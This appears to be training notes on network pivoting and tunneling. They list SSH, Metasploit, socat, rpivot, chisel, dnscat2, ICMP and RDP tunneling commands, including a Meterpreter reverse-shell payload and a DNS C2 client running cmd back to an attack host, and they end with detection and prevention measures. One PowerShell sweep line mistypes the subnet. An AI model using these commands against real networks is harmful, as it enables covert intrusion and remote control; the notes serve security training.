## 🎯 Main Idea
- Move deeper into networks you cannot reach directly by routing traffic through an already-compromised "pivot host" (proxy / foothold / jump host).
- Pivoting = crossing network boundaries via a dual-homed compromised host; Tunneling = encapsulating traffic in another protocol (HTTP/SSH/DNS/ICMP) to bypass firewalls and evade detection; Lateral movement = spreading across hosts.
- Master many Linux and Windows tools for local/remote/dynamic port forwarding, SOCKS proxying, and protocol tunneling, plus how defenders detect and prevent them.

## 💥 Attack / Exploit Vectors
### Networking Behind Pivoting
- Enumerate NICs/IPs, subnets, gateway, and routing to find reachable internal networks (a second NIC = dual-homed pivot).
- **Commands**
  - `ifconfig` / `ipconfig` — Display network configuration (Linux / Windows).
  - `netstat -r` — Display the IPv4 routing table.
  - `nmap -sT -p22,3306 <target>` — Scan for SSH/MySQL open ports.

### SSH Local Port Forwarding (-L)
- Pull a remote host's local-only service back to a port on the attack host to reach/exploit it locally.
- **Commands**
  - `ssh -L 1234:localhost:3306 Ubuntu@<target>` — Forward local 1234 to remote 3306.
  - `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<target>` — Forward multiple ports.
  - `netstat -antp | grep 1234` — Verify the tunnel.
  - `nmap -v -sV -p1234 localhost` — Scan the service through the local port.

### SSH Dynamic Port Forwarding + SOCKS Tunneling (-D)
- Open a SOCKS proxy over SSH so arbitrary tools route through the pivot into unreachable subnets via proxychains.
- **Commands**
  - `ssh -D 9050 ubuntu@<target>` — Dynamic port forward / SOCKS proxy on 9050.
  - `tail -4 /etc/proxychains.conf` — Confirm SOCKS config (`socks4 127.0.0.1 9050`).
  - `proxychains nmap -v -sn 172.16.5.1-200` — Proxied host discovery.
  - `proxychains nmap -v -Pn -sT 172.16.5.19` — Proxied TCP connect scan (`-sT` required).
  - `proxychains msfconsole` — Route Metasploit through the proxy.
  - `proxychains xfreerdp /v:<target> /u:victor /p:pass@123` — Proxied RDP.

### SSH Remote / Reverse Port Forwarding (-R)
- Push a listener out to the pivot so a deep target can reach your attack-host handler and return a reverse shell.
- **Commands**
  - `ssh -R <PivotIP>:8080:0.0.0.0:80 ubuntu@<target> -vN` — Reverse tunnel (pivot 8080 → attack 80).
  - `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attack> LPORT=8080 -f elf -o backupjob` — Linux reverse payload.
  - `msf6 > use exploit/multi/handler` — Catch the reverse connection.

### Meterpreter Tunneling & Port Forwarding
- Use an existing Meterpreter session on the pivot: autoroute adds internal routes, socks_proxy spins a SOCKS listener, portfwd creates TCP relays.
- **Commands**
  - `msf6 > use post/multi/manage/autoroute` — Add routes to the internal subnet.
  - `msf6 > use auxiliary/server/socks_proxy` — Start a SOCKS listener; `jobs` to confirm.
  - `meterpreter > portfwd add -l 3300 -p 3389 -r <target>` — Local forward (local 3300 → target RDP 3389).
  - `meterpreter > portfwd add -R -l 8081 -p 1234 -L <attack>` — Reverse forward.
  - `xfreerdp /v:localhost:3300 /u:victor /p:pass@123` — RDP through the forward.
  - `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23` — Ping-sweep enumeration.
  - `meterpreter > bg` — Background the session.

### Ping-Sweep Host Discovery (one-liners)
- Discover live internal hosts from the pivot when scanners are slow/blocked.
- **Commands**
  - `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done` — Linux sweep.
  - `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"` — Windows cmd sweep.
  - `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` — PowerShell sweep.

### Socat Redirection — Reverse & Bind Shell
- Standalone bidirectional relay/redirector on the pivot; no SSH needed.
- **Commands**
  - `socat TCP4-LISTEN:8080,fork TCP4:<attack>:80` — Relay a reverse shell to the attack host.
  - `socat TCP4-LISTEN:8080,fork TCP4:<target>:8443` — Relay a bind-shell connection to the target.

### SSH for Windows — plink.exe
- Living-off-the-land SSH on Windows pivots for dynamic forwards / SOCKS (pair with Proxifier for GUI apps).
- **Commands**
  - `plink -D 9050 ubuntu@<target>` — Dynamic port forward from a Windows host.

### SSH Pivoting with sshuttle
- "Poor man's VPN" over SSH; auto-configures iptables so you tunnel a whole subnet without proxychains (SSH only).
- **Commands**
  - `sudo apt-get install sshuttle` — Install sshuttle.
  - `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v` — Route the internal network over SSH.

### Web Server Pivoting with rpivot
- Reverse SOCKS proxy (Python2): internal client back-connects to server.py on the attack host; NTLM-proxy aware.
- **Commands**
  - `sudo git clone https://github.com/klsecservices/rpivot.git` — Clone rpivot.
  - `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` — Run server on attack host.
  - `scp -r rpivot ubuntu@<target>` — Copy rpivot to the pivot.
  - `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999` — Connect client back.
  - `python client.py --server-ip <web> --server-port 8080 --ntlm-proxy-ip <proxy> --ntlm-proxy-port 8081 --domain <dom> --username <u> --password <p>` — Through an NTLM HTTP proxy.
  - `proxychains firefox-esr <webserver>:80` — Browse internal web via proxy.

### Port Forwarding with Windows netsh
- Native Windows portproxy rule on a compromised Windows pivot.
- **Commands**
  - `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25` — Forward 8080 → internal RDP.
  - `netsh.exe interface portproxy show v4tov4` — View the rule.

### DNS Tunneling with dnscat2
- Stealthy encrypted C2 carried inside DNS records to bypass firewalls that strip HTTPS.
- **Commands**
  - `git clone https://github.com/iagox86/dnscat2.git` — Clone dnscat2.
  - `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` — Start server.
  - `Import-Module dnscat2.ps1` — Import the PowerShell client (dnscat2-powershell).
  - `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd` — Connect client back.
  - `dnscat2> window -i 1` — Interact with the session.

### SOCKS5 Tunneling with Chisel
- Go tool: TCP/UDP tunnel over HTTP (SSH-secured); forward and reverse pivot modes.
- **Commands**
  - `./chisel server -v -p 1234 --socks5` — Start chisel server on the pivot.
  - `./chisel client -v 10.129.202.64:1234 socks` — Connect client, open local SOCKS5 (1080).

### ICMP Tunneling with ptunnel-ng
- Encapsulate TCP inside ICMP echo packets; works wherever outbound ping is allowed.
- **Commands**
  - `git clone https://github.com/utoni/ptunnel-ng.git` + `sudo ./autogen.sh` — Clone and build.
  - `sudo ./ptunnel-ng -r10.129.202.64 -R22` — Start server on the pivot.
  - `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` — Connect client (local port 2222).
  - `ssh -p2222 -lubuntu 127.0.0.1` — SSH through the ICMP tunnel (add `-D 9050` for SOCKS).

### RDP & SOCKS Tunneling with SocksOverRDP
- Windows-only: tunnel packets over an RDP connection's Dynamic Virtual Channels (DVC); route apps with Proxifier.
- **Commands**
  - `regsvr32.exe SocksOverRDP-Plugin.dll` — Register the plugin.
  - `netstat -antb | findstr 1080` — Confirm the local SOCKS listener (127.0.0.1:1080).

## 🛠️ Key Tools & Concepts
- Port forwarding types — Local (`-L`), Remote/Reverse (`-R`), Dynamic/SOCKS (`-D`).
- SOCKS proxy — SOCKS4 (no auth/UDP) vs SOCKS5 (auth + UDP); client-initiated routing.
- proxychains — Forces a tool's TCP through SOCKS/HTTP proxies (`/etc/proxychains.conf`); only full TCP connect (`-sT`) scans work.
- SSH (-L/-R/-D/-vN) + scp — Core forwarding and payload transfer.
- Metasploit autoroute / socks_proxy / portfwd / multi/handler / msfvenom — In-session pivoting.
- Socat — Standalone relay (reverse + bind), no SSH.
- Plink / Proxifier — Windows SSH forwarding and routing GUI apps through SOCKS.
- sshuttle / rpivot / netsh portproxy — VPN-like SSH tunnel / reverse SOCKS web pivot / native Windows forwarding.
- Chisel / dnscat2 / ptunnel-ng / SocksOverRDP — HTTP / DNS / ICMP / RDP covert tunnels.
- Pivot host identification — Check privilege, connections, multiple NICs (dual-homed), VPN/remote software.

## 🛡️ Mitigations (Detection & Prevention)
- Baseline & documentation — Maintain DNS/DHCP/backup records, host & app inventory, list of dual-homed hosts and privileged users, current network diagram; monitor critical assets.
- People — Security awareness, address BYOD/remote risk, enforce MFA (esp. admins), SOC monitoring, practiced incident response.
- Process — Documented policies, asset management, access control + provisioning, standardized hardening/gold images, change management, DR plan.
- Technology — Firewalls, network segmentation, IDS/IPS (network + host), event logging into a SIEM, DMZ for internet-facing hosts, separate production vs management networks, restrict standard users from infrastructure.
- MITRE ATT&CK defenses — External/Remote Services (T1133/T1021: segment, MFA, VPN, OOB mgmt); Non-Standard Ports (T1571: baseline + NIDS); Protocol Tunneling (T1572: lock down ports, block external DNS, watch beaconing); Proxy Use (T1090: allow/deny lists); LOTL (baseline behavior, EDR, SIEM).
